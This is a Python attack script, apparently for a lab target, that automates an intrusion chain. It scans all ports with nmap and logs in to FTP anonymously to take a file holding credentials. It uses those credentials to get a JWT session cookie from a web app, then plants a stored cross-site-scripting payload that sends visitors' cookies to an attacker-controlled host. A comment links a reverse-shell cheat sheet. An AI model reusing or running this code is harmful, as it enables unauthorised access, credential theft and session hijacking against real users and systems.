#!/usr/bin/python3

import nmap # https://pypi.org/project/python-nmap/
from ftplib import FTP # https://docs.python.org/3/library/ftplib.html
import requests

nm = nmap.PortScanner()

ip_victima = '172.17.0.2'

nm.scan(ip_victima, '1-65535', '-sS -n --min-rate=5000')

#print(nm[ip_victima]['tcp'][5000]['name'])


# Reverse Shells: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

for port in nm[ip_victima]['tcp']:
    
    if nm[ip_victima]['tcp'][port]['name'] == "ftp":
        nm_ftp = nmap.PortScanner()

        nm_ftp.scan(ip_victima, str(port), '--script=ftp-anon.nse')

        fichero_v = nm_ftp[ip_victima]['tcp'][port]['script']['ftp-anon'].split(' ')

        name_fichero = fichero_v[len(fichero_v) - 1]

        ftp = FTP(ip_victima)

        username = "anonymous"

        ftp.login(username, "")

        ftp.retrbinary('RETR {}'.format(name_fichero), open(name_fichero, 'wb').write)
        
        ftp.quit()

        file = open(name_fichero, 'r')
        
        v_file = file.read().strip().split(' ')

        v_user = v_file[len(v_file) - 1].split('\n')

        username = v_user[len(v_user) - 1].split(':')[0] 
        password = v_user[len(v_user) - 1].split(':')[1] 
        
        data = {
            'username': username,
            'password': password
        }

        r = requests.post("http://{}:5000/login".format(ip_victima), data=data, allow_redirects=False)

        cookie = r.headers['Set-Cookie'].split('=')[1]

        cookies = {
            "JWT_token": cookie
        }

        data = {
            'autor': 'test',
            'contenido': '<script>var xhttp = new XMLHttpRequest(); cookie = document.cookie;  url_atacante = "http://192.168.232.129:8000/envio_cookie?cookie=" + cookie;  xhttp.open("GET", url_atacante, true); xhttp.send();</script>'
        }

        r = requests.post("http://{}:5000/sendit".format(ip_victima), cookies=cookies, data=data)

        print(r.text)
